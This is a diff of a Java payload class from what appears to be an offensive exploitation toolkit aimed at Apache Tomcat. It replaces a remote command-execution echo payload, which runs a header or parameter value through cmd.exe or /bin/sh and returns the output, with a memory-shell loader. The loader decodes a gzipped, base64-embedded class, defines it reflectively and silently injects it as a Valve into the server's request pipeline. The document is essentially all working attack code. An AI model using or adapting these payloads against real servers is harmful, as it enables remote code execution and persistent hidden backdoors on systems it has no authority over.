@@ -1,82 +1,102 @@
-package com.ppp.middleware.rceecho;
+package com.ppp.middleware.loader;
+
 
 import com.ppp.annotation.JavaClassModifiable;
 import com.ppp.annotation.JavaClassType;
+import com.ppp.annotation.MemShell;
 import com.ppp.annotation.Middleware;
 
-import java.io.InputStream;
-import java.lang.reflect.Field;
-import java.lang.reflect.Method;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.lang.reflect.*;
 import java.util.*;
+import java.util.zip.GZIPInputStream;
 
 /**
  * @author Whoopsunix
- * 线程遍历找 Request 5-11
  */
 @Middleware(Middleware.Tomcat)
-@JavaClassType(JavaClassType.AutoFind)
-@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.PARAM})
-public class TomcatAutoRE {
-    private static String HEADER;
-    private static String PARAM;
+@MemShell(MemShell.Valve)
+@JavaClassType(JavaClassType.Default)
+@JavaClassModifiable({JavaClassModifiable.CLASSNAME})
+public class TomcatValveThreadLoader {
+    private static String gzipObject;
+    private static String CLASSNAME;
 
-    public TomcatAutoRE() {
-
+    public TomcatValveThreadLoader() {
     }
 
     static {
         try {
-            Object request = getTargetObject("org.apache.coyote.Request");
-            Object response = invokeMethod(request, "getResponse", new Class[]{}, new Object[]{});
+            // 获取 standardContext
+            Object standardContext = getTargetObject("org.apache.catalina.core.StandardContext");
+            inject(standardContext);
+        } catch (Throwable e) {
 
-            Object header = invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
-            Object parameters = invokeMethod(request, "getParameters", new Class[]{}, new Object[]{});
-            Object param = invokeMethod(parameters, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
-
-            String str = null;
-            if (header != null) {
-                str = (String) header;
-            } else if (param != null) {
-                str = (String) param;
-            }
-            String result = exec(str);
-            invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
-            try {
-                invokeMethod(response, "doWrite", new Class[]{java.nio.ByteBuffer.class}, new Object[]{java.nio.ByteBuffer.wrap(result.getBytes())});
-            } catch (Exception e) {
-                Class clazz;
-                try {
-                    clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
-                } catch (ClassNotFoundException e1) {
-                    clazz = request.getClass().getClassLoader().loadClass("org.apache.tomcat.util.buf.ByteChunk");
+        }
+    }
+    public static void inject(Object standardContext) {
+        try {
+            Object pipeline = getFieldValue(standardContext, "pipeline");
+            Object[] valves = (Object[]) invokeMethod(pipeline, "getValves", new Class[]{}, new Object[]{});
+            for (Object valve : valves) {
+                if (valve.getClass().getName().equalsIgnoreCase(CLASSNAME)) {
+                    return;
                 }
-                Object byteChunk = clazz.newInstance();
-                invokeMethod(clazz, byteChunk, "setBytes", new Class[]{byte[].class, Integer.TYPE, Integer.TYPE}, new Object[]{result.getBytes(), 0, result.getBytes().length});
-                invokeMethod(response, "doWrite", new Class[]{clazz}, new Object[]{byteChunk});
             }
+
+            byte[] bytes = decompress(gzipObject);
+
+            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
+            defineClass.setAccessible(true);
+            Class clazz;
+            try {
+                clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
+            } catch (Exception e) {
+                clazz = classLoader.loadClass(CLASSNAME);
+            }
+
+//            invokeMethod(pipeline, "addValve", new Class[]{Class.forName("org.apache.catalina.Valve")}, new Object[]{clazz.newInstance()});
+
+            Constructor constructor = clazz.getDeclaredConstructor(Object.class);
+            constructor.setAccessible(true);
+            Object javaObject = constructor.newInstance(pipeline);
+
+            Class valveClass = Class.forName("org.apache.catalina.Valve");
+            Object object = Proxy.newProxyInstance(valveClass.getClassLoader(), new Class[]{valveClass}, (InvocationHandler) javaObject);
+            invokeMethod(pipeline, "addValve", new Class[]{valveClass}, new Object[]{object});
         } catch (Exception e) {
+
         }
     }
 
-    public static String exec(String str) throws Exception {
-        String[] cmd;
-        if (System.getProperty("os.name").toLowerCase().contains("win")) {
-            cmd = new String[]{"cmd.exe", "/c", str};
-        } else {
-            cmd = new String[]{"/bin/sh", "-c", str};
+    public static byte[] decompress(String gzipObject) throws Exception {
+        ByteArrayInputStream bais = new ByteArrayInputStream(base64(gzipObject));
+        try {
+            GZIPInputStream gzipInputStream = new GZIPInputStream(bais);
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            byte[] buffer = new byte[1024];
+            int len;
+            while ((len = gzipInputStream.read(buffer)) > 0) {
+                baos.write(buffer, 0, len);
+            }
+            return baos.toByteArray();
+        } catch (Exception e) {
+
         }
-        InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
-        return exec_result(inputStream);
+        return null;
     }
 
-    public static String exec_result(InputStream inputStream) throws Exception {
-        byte[] bytes = new byte[1024];
-        int len;
-        StringBuilder stringBuilder = new StringBuilder();
-        while ((len = inputStream.read(bytes)) != -1) {
-            stringBuilder.append(new String(bytes, 0, len));
+    public static byte[] base64(String str) throws Exception {
+        try {
+            Class clazz = Class.forName("sun.misc.BASE64Decoder");
+            return (byte[]) invokeMethod(clazz.getSuperclass(), clazz.newInstance(), "decodeBuffer", new Class[]{String.class}, new Object[]{str});
+        } catch (Exception var5) {
+            Class clazz = Class.forName("java.util.Base64");
+            Object decoder = invokeMethod(clazz, null, "getDecoder", new Class[]{}, new Object[]{});
+            return (byte[]) invokeMethod(decoder.getClass(), decoder, "decode", new Class[]{String.class}, new Object[]{str});
         }
-        return stringBuilder.toString();
     }
 
     public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
@@ -95,7 +115,6 @@ public class TomcatAutoRE {
         }
         return field;
     }
-
     public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
         try {
             return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
@@ -112,7 +131,7 @@ public class TomcatAutoRE {
     }
 
     public static Object getTargetObject(String className) throws Exception {
-        List<ClassLoader> activeClassLoaders = new TomcatAutoRE().getActiveClassLoaders();
+        List<ClassLoader> activeClassLoaders = new TomcatValveThreadLoader().getActiveClassLoaders();
 
         Class cls = getTargetClass(className, activeClassLoaders);
 
@@ -123,9 +142,53 @@ public class TomcatAutoRE {
         // 原始类型和包装类都不递归
         HashSet<String> breakType = new HashSet(Arrays.asList(int.class.getName(), short.class.getName(), long.class.getName(), double.class.getName(), byte.class.getName(), float.class.getName(), char.class.getName(), boolean.class.getName(), Integer.class.getName(), Short.class.getName(), Long.class.getName(), Double.class.getName(), Byte.class.getName(), Float.class.getName(), Character.class.getName(), Boolean.class.getName(), String.class.getName()));
 
-        Object result = getTargetObject(cls, Thread.currentThread(), breakObject, breakType, 40);
+        Object result = getTargetObject(cls, Thread.currentThread(), breakObject, breakType, 30);
 
         return result;
+    }
+
+    /**
+     * 遍历 ClassLoader 加载目标 Class
+     */
+    public static Class getTargetClass(String className, List<ClassLoader> activeClassLoaders) {
+        for (ClassLoader activeClassLoader : activeClassLoaders) {
+            try {
+                return Class.forName(className, true, activeClassLoader);
+            } catch (Throwable e) {
+
+            }
+        }
+        return null;
+    }
+
+    /**
+     * 获取活跃线程
+     */
+    public List<ClassLoader> getActiveClassLoaders() throws Exception {
+        Set<ClassLoader> activeClassLoaders = new HashSet();
+
+        // 加载当前对象的加载器
+        activeClassLoaders.add(this.getClass().getClassLoader());
+
+        // 当前线程的上下文类加载器
+        activeClassLoaders.add(Thread.currentThread().getContextClassLoader());
+
+//        // 应用程序类加载器
+//        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();
+//        activeClassLoaders.add(systemClassLoader);
+//
+//        // 扩展类加载器
+//        activeClassLoaders.add(systemClassLoader.getParent());
+
+        // 获取线程组
+        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
+        Thread[] threads = new Thread[threadGroup.activeCount()];
+        int count = threadGroup.enumerate(threads, true);
+        for (int i = 0; i < count; i++) {
+            activeClassLoaders.add(threads[i].getContextClassLoader());
+        }
+
+        return new ArrayList(activeClassLoaders);
     }
 
     /**
@@ -226,51 +289,6 @@ public class TomcatAutoRE {
         }
 
         return null;
-    }
-
-
-    /**
-     * 遍历 ClassLoader 加载目标 Class
-     */
-    public static Class getTargetClass(String className, List<ClassLoader> activeClassLoaders) {
-        for (ClassLoader activeClassLoader : activeClassLoaders) {
-            try {
-                return Class.forName(className, true, activeClassLoader);
-            } catch (Throwable e) {
-
-            }
-        }
-        return null;
-    }
-
-    /**
-     * 获取活跃线程
-     */
-    public List<ClassLoader> getActiveClassLoaders() throws Exception {
-        Set<ClassLoader> activeClassLoaders = new HashSet();
-
-        // 加载当前对象的加载器
-        activeClassLoaders.add(this.getClass().getClassLoader());
-
-        // 当前线程的上下文类加载器
-        activeClassLoaders.add(Thread.currentThread().getContextClassLoader());
-
-//        // 应用程序类加载器
-//        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();
-//        activeClassLoaders.add(systemClassLoader);
-//
-//        // 扩展类加载器
-//        activeClassLoaders.add(systemClassLoader.getParent());
-
-        // 获取线程组
-        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
-        Thread[] threads = new Thread[threadGroup.activeCount()];
-        int count = threadGroup.enumerate(threads, true);
-        for (int i = 0; i < count; i++) {
-            activeClassLoaders.add(threads[i].getContextClassLoader());
-        }
-
-        return new ArrayList(activeClassLoaders);
     }
 
 }
